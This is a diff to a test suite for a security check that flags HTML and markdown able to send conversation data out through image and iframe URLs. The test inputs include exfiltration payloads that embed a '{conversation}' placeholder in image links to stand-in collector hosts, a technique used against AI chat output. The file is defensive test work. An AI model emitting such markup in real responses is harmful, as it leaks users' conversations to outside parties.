@@ -612,6 +612,13 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
             "<svg><a><image><set attributeName='href' to='https://collector.test/{c}.png'/></image></a></svg>",
             ["exfiltration_query"],
         ),
+        (
+            "<div><select><iframe></select><img src='https://collector.test/{conversation}.png'></div>",
+            ["uncheckable_markup"],
+        ),
+        ("<select><title></select><img src='https://collector.test/{c}.png'>", ["uncheckable_markup"]),
+        ("<select><option>a</option><script>x</script></select><img src='https://a.test/a.png'>", []),
+        ("<select></select><iframe src='https://a.test/'></iframe>", []),
         ('<div style="color:red;margin:0">x</div>', []),
         ("<style>.a{color:red;font-family:'Inter'}</style>", []),
         ("<template><style>.a{background:url(https://collector.test/{c}.png)}</style></template>", []),
@@ -775,6 +782,23 @@ def test_abruptly_closed_comments_are_flagged(text: str) -> None:
     found = exfiltration_link_classes(text)
     assert found
     assert set(found) <= {"exfiltration_query", "uncheckable_markup"}
+
+
+def test_a_long_base_does_not_multiply_into_every_relative_url(monkeypatch: pytest.MonkeyPatch) -> None:
+    resolved: list[str] = []
+    original = catalog_security._resolve
+    monkeypatch.setattr(catalog_security, "_resolve", lambda base, url: resolved.append(base) or original(base, url))
+    text = "<base href='https://a.test/" + "a" * 32_000 + "/'>" + "<img src='x'>" * 2_000
+    assert exfiltration_link_classes(text) == ["uncheckable_markup"]
+    assert sum(map(len, resolved)) < 4 * catalog_security.MAX_RENDERED_CHARS
+
+
+def test_the_url_budget_is_shared_with_srcdoc_documents() -> None:
+    # Each document alone stays under the budget; together they exceed it.
+    base = "<base href='https://a.test/" + "a" * 2_000 + "/'>"
+    iframe = "<iframe srcdoc='" + "&lt;img src=x&gt;" * 100 + "'></iframe>"
+    assert exfiltration_link_classes(base + iframe) == []
+    assert exfiltration_link_classes(base + iframe * 2) == ["uncheckable_markup"]
 
 
 def test_oversized_text_without_markup_passes() -> None:
